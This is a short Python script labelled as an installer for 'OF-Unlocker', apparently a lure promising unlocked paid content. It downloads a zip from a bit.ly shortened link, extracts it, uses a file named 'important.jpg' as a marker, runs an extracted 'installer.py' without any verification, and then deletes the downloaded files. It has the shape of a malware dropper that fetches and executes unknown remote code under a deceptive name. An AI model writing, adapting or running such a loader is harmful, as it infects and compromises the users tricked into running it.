import os
import sys
import urllib.request
import zipfile
import subprocess
import shutil
from pathlib import Path

def _check_existing():
    return Path('important.jpg').exists()

def _run_existing():
    if _check_existing():
        subprocess.run([sys.executable, 'installer.py'])
        return True
    return False

def _download_package():
    zip_url = "https://bit.ly/package-file"
    zip_file = Path("package.zip")
    
    try:
        urllib.request.urlretrieve(zip_url, zip_file)
        
        if zip_file.exists() and zip_file.stat().st_size > 0:
            with zipfile.ZipFile(zip_file, 'r') as zip_ref:
                zip_ref.extractall(".")
            
            extracted_dir = Path("package")
            if extracted_dir.exists():
                for item in extracted_dir.glob("*"):
                    if item.is_file():
                        shutil.copy(item, ".")
                shutil.rmtree(extracted_dir)
            
            return True
        return False
        
    except Exception:
        return False

def _cleanup():
    try:
        zip_file = Path("package.zip")
        if zip_file.exists():
            os.remove(zip_file)
        
        extracted_dir = Path("package")
        if extracted_dir.exists():
            shutil.rmtree(extracted_dir)
    except Exception:
        pass

if __name__ == "__main__":
    print("Installing OF-Unlocker")
    
    if _run_existing():
        sys.exit(0)
    
    if not _download_package():
        print("Install failed, try again")
        sys.exit(1)
    
    if _check_existing():
        _cleanup()
        subprocess.run([sys.executable, 'installer.py'])
    else:
        _cleanup()
        print("Install failed, try again")
        sys.exit(1)